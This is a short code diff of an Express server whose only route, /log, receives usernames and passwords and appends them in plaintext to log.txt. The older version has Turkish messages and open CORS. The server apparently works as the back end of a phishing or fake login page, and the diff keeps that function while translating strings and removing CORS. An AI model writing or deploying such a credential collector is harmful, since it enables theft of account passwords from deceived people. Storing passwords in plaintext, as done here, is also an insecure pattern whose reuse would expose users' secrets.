@@ -1,19 +1,15 @@
 const express = require("express");
 const fs = require("fs");
-const cors = require("cors");
 const app = express();
+const PORT = process.env.PORT || 3000;
 
-app.use(cors());
 app.use(express.json());
 
 app.post("/log", (req, res) => {
-    const { username, password } = req.body;
-    const log = `[${new Date().toLocaleString()}] Kullanıcı: ${username}, Şifre: ${password}\n`;
-    fs.appendFileSync("log.txt", log, "utf8");
-    res.status(200).send("OK");
+  const { username, password } = req.body;
+  const logEntry = `Username: ${username}, Password: ${password}\n`;
+  fs.appendFileSync("log.txt", logEntry);
+  res.sendStatus(200);
 });
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`Sunucu çalışıyor: ${PORT}`);
-});
+app.listen(PORT, () => console.log(`Log server running on ${PORT}`));
